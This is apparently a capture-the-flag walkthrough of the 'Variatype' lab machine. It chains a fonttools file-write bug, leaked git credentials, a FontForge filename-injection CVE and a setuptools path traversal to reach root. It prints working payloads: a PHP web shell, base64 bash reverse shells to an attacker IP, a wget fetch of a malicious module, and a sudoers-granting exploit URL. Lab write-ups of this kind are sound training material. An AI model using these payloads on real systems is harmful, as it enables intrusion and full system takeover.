

# Variatype.htb Walk through

## 1. Reconnaissance

We start with a standard Nmap scan to enumerate open ports and services:

Bash

```
nmap -sV -sC variatype.htb
```

The scan reveals two open ports: **HTTP (80)** and **SSH (22)**.

## 2. Initial Access

### Discovering the Vulnerability

While enumerating the web application, I discovered that it uses `fontools` for font creation. I found a critical Arbitrary File Write vulnerability and a PoC for it: [GHSA-768j-98cg-p3fv](https://github.com/advisories/GHSA-768j-98cg-p3fv)

The vulnerable code snippet looks like this:

Python

```
filename = vf.filename # Unsanitized filename
output_path = os.path.join(output_dir, filename) # Path traversal
vf.save(output_path) # Arbitrary file write
```

The file name is vulnerable to injection. My payload was successfully injected, but the challenge was finding a way to execute it from the web server to get a shell.

### The Path Traversal Struggle

I was stuck at this point for a while. I tried writing to `../../../../../../var/www/html/shell.php`, but the website returned a failure message (`Font generation failed during processing`). Interestingly, it only accepted `../../`, and using absolute paths like `/var/www/html/shell.php` caused the same problem.

Since my goal was to find a path accessible from the web to execute my script, I decided to look for other avenues. I discovered a subdomain: `portal.variatype.htb`.

I didn't have credentials to log in, so I started fuzzing for directories:

Bash

```
ffuf -c -u http://portal.variatype.htb/FUZZ -w /home/youssef/Downloads/wordlists/common.txt
```

This revealed a few interesting endpoints:

- `/styles.css`
    
- `/files/`
    
- `/.git/HEAD`
    
- `/index.php`
    

### Dumping Git and Finding Credentials

Finding the `.git` directory was a huge win. I dumped the repository using `git-dumper`. Checking the commit history:

Bash

```
git log
```

I found a commit mentioning "remove hardcoded credentials". Initially, I searched for the password but couldn't find it, making me think it was a rabbit hole. After asking a friend who solved the machine, they confirmed I was on the right track but needed to search the commit history more deeply.

By viewing the specific diffs of the object files using:

Bash

```
git log -p
```

I successfully found the removed hardcoded credentials for a service account: **Credentials:** `gitbot : G1tB0t_Acc3ss_2025!`

### Gaining the Shell (The Nginx Guessing Game)

With the ability to write files, I generated a malicious font file with an XML injection payload (RCE) in the `CDATA` section based on the CVE PoC:

XML

```
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
<axes>
<axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
<labelname xml:lang="en"><![CDATA[<?php echo shell_exec("echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjQ0LzQ0NDQgMD4mMQ== |base64 -d|bash");?>]]]]><![CDATA[>]]></labelname>
<labelname xml:lang="fr">MEOW2</labelname>
</axis>
</axes>
...
</designspace>
```

However, I still couldn't get it to execute. I tried fuzzing all PHP pages on the subdomain to see if I could trigger it:

Bash

```
ffuf -c -u http://portal.variatype.htb/FUZZ.php -w '/home/youssef/Downloads/wordlists/common.txt' -fs 154
```

Nothing new showed up. I realized I needed to use path traversal to drop the file directly into the correct web root directory so I could navigate to it and execute it.

This part required some guessing, which was frustrating. After consulting with another player, I learned a crucial piece of Nginx methodology: **Nginx often uses the domain name as the convention for the web root folder name.** Therefore, the public folder serving those files was likely: `/var/www/portal.variatype.htb/public/files/`

I edited my filename with this absolute path (`/var/www/portal.variatype.htb/public/shell.php`), put the script content in the CDATA, uploaded it, navigated to the file, and **BOOM! We got a shell as `www-data`.**

---

## 3. Lateral Movement (User: steve)

After navigating through some potential rabbit holes, I found the intended path to get the user shell. There is a cron job running with `steve`'s privileges targeting `/opt/process_client_submissions.bak`.

### Analyzing the Cron Script

The script acts as a Font Processing Pipeline. It monitors `/var/www/portal.variatype.htb/public/files`, processes fonts using a binary called `fontforge`, and moves them.

### Failed Attempt: Python Module Hijacking

Initially, I thought about Python Library Hijacking. The script runs a block of Python code. I checked the module search paths:

Bash

```
python3 -c 'import sys; print("\n".join(sys.path))'
```

The first entry was an empty string, meaning Python checks the current directory first. I thought about dropping a malicious `fontforge.py` to get a reverse shell:

Bash

```
wget http://10.10.16.44:8000/fontforge.py
```

However, `www-data` didn't have the necessary permissions in the target directory to perform the hijack.

### Success: CVE-2024-25082 (FontForge RCE)

Looking closer at the script, it uses the `fontforge` binary directly: `/usr/local/src/fontforge/build/bin/fontforge`

I checked the version: `20230101`. Searching for vulnerabilities for this specific version revealed **CVE-2024-25082 (RCE via archived file)**.

The cronjob script enforces a strict naming policy using a regex, but we can bypass this by archiving our payload. The vulnerability allows RCE if a specifically crafted filename is processed inside an archive.

I created a font file with a command injection payload as its name:

Bash

```
font.ttf;echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjQ0LzQ0NDUgMD4mMQ==|base64 -d|bash &
```

I archived this file into a ZIP. The cron job picked it up, `fontforge` processed the archived file, the CVE triggered, and I received a reverse shell as `steve`.

---

## 4. Privilege Escalation (Root)

Checking our privileges:

Bash

```
sudo -l
```

Output:

Plaintext

```
User steve may run the following commands on variatype:
    (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
```

### Analyzing `install_validator.py`

The script takes a URL as an argument and downloads a validation plugin to `/opt/font-tools/validators/` using `setuptools.package_index.PackageIndex().download()`. It also validates that the URL starts with `http` or `https`.

It looked like an Arbitrary File Write via Path Traversal. The `download()` function internally likely uses `os.path.join()`. In Python, if `os.path.join()` encounters an absolute path as a secondary argument, it discards the previous paths and starts from root (`/`).

### CVE-2025-47273 (setuptools Path Traversal)

I checked the `setuptools` version:

Bash

```
pip3 show setuptools
# Version: 78.1.0
```

This version is vulnerable to **CVE-2025-47273**, which is exactly the arbitrary file write via path traversal we suspected.

To exploit this, I needed to trick the URL parser and the download function into writing to `/etc/sudoers.d/`. I created a malicious sudoers configuration file locally and hosted it:

Bash

```
# In a file named 'tmp'
steve ALL=(ALL) NOPASSWD:ALL
```

Bash

```
python3 -m http.server 8000
```

To prevent Python from parsing the `/` immediately and breaking the URL structure, I URL-encoded the payload path:

Bash

```
sudo /usr/bin/python3 /opt/font-tools/install_validator.py http://10.10.16.44:8000/%2fetc%2fsudoers.d%2ftmp
```

The script downloaded the file and wrote it directly to `/etc/sudoers.d/tmp`. Now, `steve` has full sudo privileges!

Bash

```
sudo -su
# ROOT!
```

---

## 5. What I Learned from this Machine

- **Patience is Key:** Deeply understanding how CVEs work under the hood is crucial and how to search and find them.
    
- **Exploit Chaining:** Successfully assembling multiple exploits (Web -> Git -> CVE -> Cronjob CVE -> Sudo CVE) into one fluid chain.
    
- **Nginx Architecture:** I updated my enumeration methodology regarding Nginx directory structures. Nginx conventionally uses paths where the domain name acts as the root folder name (`/var/www/domain.name/public`).